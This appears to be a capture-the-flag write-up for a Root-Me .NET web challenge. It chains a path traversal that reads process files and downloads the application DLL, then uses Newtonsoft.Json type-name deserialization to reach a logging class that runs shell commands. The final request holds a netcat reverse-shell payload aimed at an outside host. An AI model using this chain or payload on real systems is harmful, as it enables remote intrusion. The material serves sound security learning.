# T'es pas .net ?

## Challenge

>   Baptiste ... Baptiste ... What did you do ?
>
>   Author : `Elweth` 

- Category: Web
- Difficulty: Easy

## Deployment

- Docker compose

```bash
cd src; docker compose up
``` 

## Writeup

The application allows users to report cheaters on the RootMe platform. To do so, you need to fill in the following form:

![net1](/images/net1.png)

To do this, a form is sent as a POST containing a JSON body with the form data.

The responses header Server: Kestrel corresponds to an ASP.NET application.

An error message appears when you try to access a page that doesn't exist on the application:

![net2](/images/net2.png)

Adding a new '/' produces an error message indicating that the backend has attempted to read a file from the web server root.

So we have a nice path traversal that lets you arbitrarily read files on the server.

![net3](/images/net3.png)

You can find the command that launched the current program by reading the `/proc/self/cmdline` file.

![net4](/images/net4.png)

This is a `dotnet` application that launches the `CheaterReport.dll` file.

The file can be read by reading the file `/proc/self/cwd/CheaterReport.dll` :

![net5](/images/net5.png)

It is possible to retrieve files locally by downloading the files:

```bash
curl 'http://node1.challenges.ctf20k.root-me.org:27202//proc/self/cwd/CheaterReport.dll' -o CheaterReport.dll
curl 'http://node1.challenges.ctf20k.root-me.org:27202//proc/self/cwd/CheaterReport.runtimeconfig.json' -o CheaterReport.runtimeconfig.json
```

![net6](/images/net6.png)

Running the application locally can be useful, but is not necessary.

To continue, you can use a .NET code decompiler. There are a number of such tools available; for the example below, I'm going to use dotPeek from JetBrains.

By importing the DLL into the software, it is possible to display the source code.

Here's the main application, showing the mapping of the various endpoints :

![net7](/images/net7.png)

The contact endpoint retrieves the content posted in JSON and uses the following function to parse it:

```dotnet
JsonConvert.DeserializeObject<object>(endAsync, new JsonSerializerSettings()
{
    TypeNameHandling = (TypeNameHandling) 3
});
```

A closer look at this feature and at the libraries imported into the application reveals the use of the Newtonsoft.Json library.

After a few Google searches, we came across the following link:

- https://exploit-notes.hdks.org/exploit/web/security-risk/json-net-deserialization/

Newtonsoft lets you arbitrarily instantiate .NET classes when JSON is deserialized, using the following syntax:

```dotnet
{
	"$type": "<namespace>.<class>, <assembly>",
	"<method_name>": "<attribute>"
}
```

So we need a "Gadget" to call to have an interesting primitive on the server (File read/write, command execution etc).

The source code is very minimalist and as we continue to audit it, we come across an interesting class.

![net8](/images/net8.png)

The logging function calls a system command with a variable passed as a constructor parameter.

We can therefore use deserialization to instantiate this class with the string we want to pass in the echo command as parameter.

In this command, you can use subshell commands to execute the commands you want.

```bash
POST /Contact HTTP/1.1
Host: node1.challenges.ctf20k.root-me.org:27202
Content-Length: 119
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
  "$type": "CheaterReport.Models.Logging, CheaterReport",
  "logged_string": "$(nc tqtpas.fr 4444 -e /bin/bash)"
}
```

![net9](/images/net9.png)